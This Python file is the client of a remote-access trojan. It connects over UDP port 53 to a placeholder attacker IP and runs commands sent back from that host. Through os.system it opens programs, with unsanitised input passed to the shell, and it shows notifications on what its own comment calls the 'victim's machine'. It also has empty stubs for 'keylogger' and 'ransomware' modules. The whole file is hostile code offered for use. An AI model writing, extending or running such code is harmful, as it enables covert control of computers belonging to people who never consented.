import socket
import os
import subprocess
import sys

SERVER_HOST = "<yourip>"
SERVER_PORT = 53
BUFFER_SIZE = 1024 * 128

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((SERVER_HOST, SERVER_PORT))
message = "connected! "
s.send(message.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    elif splited_command[0].lower() == "open":
        arg1 = splited_command[1].lower()
        os.system(f"exec {arg1}")
        output = f"The program {splited_command[1].lower()} is opened!"
    elif splited_command[0].lower() == "help":
        output = ""
    elif splited_command[0].lower() == "wallpaper":
        output = "wallpaper"
    elif splited_command[0].lower() == "notif":
        notif_msg = command.replace("notif ", "")
        os.system(f"notify-send '{notif_msg}'")
        output = "A notification appears to victim's machine"
    elif splited_command[0].lower() == "malware":
        if splited_command[1].lower() == "keylogger":
            output = ""
        elif splited_command[1].lower() == "ransomware":
            output = ""
        elif splited_command[1].lower() == "--help":
            output = ""
    else:
        output = f"The command {splited_command[0].lower()} does not exist"
    output = output + " "
    message = f"{output}"
    s.send(message.encode())
# close client connection
s.close()
